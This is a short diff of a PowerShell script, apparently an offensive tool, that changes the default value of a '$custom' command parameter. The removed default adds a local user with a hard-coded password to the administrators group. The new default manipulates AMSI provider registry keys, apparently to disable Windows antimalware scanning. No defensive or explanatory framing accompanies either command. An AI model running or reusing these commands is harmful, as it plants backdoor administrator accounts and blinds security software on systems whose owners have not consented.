@@ -7,7 +7,7 @@ function helper(){
 
 Param (    
  
- [String]$custom = "cmd.exe /c net user test123 Password123! /add && net localgroup administrators test123 /add" #default
+ [String]$custom = "cmd.exe /c powershell New-Item 'HKLM:\SOFTWARE\Microsoft\AMSI\Providers\{2781761E-28E0-4109-99FE-B9D127C57AFF}' -Force; Remove-Item -Path 'HKLM:\SOFTWARE\Microsoft\AMSI\Providers\{2781761E-28E0-4109-99FE-B9D127C57AFE}' -Recurse" #default
  
       )
  
